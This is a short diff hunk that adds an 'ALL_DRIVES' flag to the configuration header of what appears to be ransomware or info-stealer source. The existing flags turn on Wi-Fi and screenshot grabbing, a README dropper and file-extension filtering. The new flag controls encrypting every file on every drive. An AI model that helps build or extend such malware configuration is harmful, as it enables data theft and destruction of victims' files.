@@ -65,6 +65,7 @@
 #define GET_WIFI			true	// Enable or disable Wi-Fi grabber
 #define GET_SCREENSHOT		true	// Enable or disable screenshot grabber
 #define RANDOM_USERAGENT	true	// Enable or disable random user agent (if false, it uses the first one)
+#define ALL_DRIVES			false	// Enable or disable the encryption of all files in every drive
 #define ENABLE_BLACKLIST	true	// Enable or disable blacklist for file extension
 #define ENABLE_WHITELIST	true	// Enable or disable whitelist for file extension
 #define DROP_README			false	// Enable or disable README dropper
